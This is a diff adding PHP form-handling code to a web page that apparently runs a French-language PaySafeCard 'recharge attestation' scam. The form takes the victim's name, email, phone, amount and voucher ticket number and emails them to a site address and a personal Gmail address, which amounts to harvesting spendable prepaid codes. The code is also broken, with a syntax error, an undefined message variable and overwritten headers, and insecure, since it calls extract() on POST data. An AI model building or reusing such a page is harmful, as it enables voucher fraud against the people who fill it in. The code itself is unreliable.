@@ -1,3 +1,66 @@
+<?php
+
+session_start();
+
+//If form send and all fields is not empty
+if(!empty($_POST)){
+
+    $errors = array();
+
+    extract($_POST);
+
+    $fname = strip_tags($fname);
+    $email = strip_tags($email);
+    $phone = strip_tags($phone);
+    $montant = strip_tags($montant);
+    $ticket = strip_tags($ticket);
+
+
+
+    if(empty($fname)){
+        array_push($errors, 'Entrez votre nom et prénoms');
+    }
+    if(empty($email)){
+        array_push($errors, 'Entrez votre email');
+    }
+
+    if(empty($montant)){
+        array_push($errors, 'Entrez le montant');
+    }
+
+    if(empty($ticket)){
+        array_push($errors, 'Entrez le ticket');
+    }
+
+    if(empty($phone)){
+        array_push($errors, 'Entrez votre numéro de téléphone');
+    }
+
+    if(!filter_var($email, FILTER_VALIDATE_EMAIL)){
+        array_push($errors, 'Adresse email invalide');
+    }
+
+    if(count($errors) == 0){
+        $mailTo = "paysafecard@fiches-attestationdesrecharges.com", "kilmeraf90@gmail.com";
+        $headers = "From: Site de Fiche d'attestation des recharges\r\n";
+        $headers = "Reply-To: paysafecard@fiches-attestationdesrecharges.com\r\n";
+        $headers = "Content-type: text/html\r\n";
+        $subject = "Demande de Téléchargement de fiche de recharge de la part de ".$fname.".";
+        $txt = "Demande de Téléchargement de fiche de recharge :\n\n- Type de recharge : PaySafeCard.\n\n- Nom du client : ".$fname.".\n\n- Adresse mail du client : ".$email.".\n\n- Montant : ".$montant.".\n\n- Numéro de téléphone : ".$phone.".\n\n- Numéro du ticket : ".$ticket.".";
+
+        mail($mailTo, $subject, $message, $headers);
+
+        unset($mailTo);
+        unset($headers);
+        unset($subject);
+        unset($txt);
+
+        header("Location: answer.html");
+    }
+}
+
+?>
+
 <!doctype html>
 <html lang="en">
   <head>
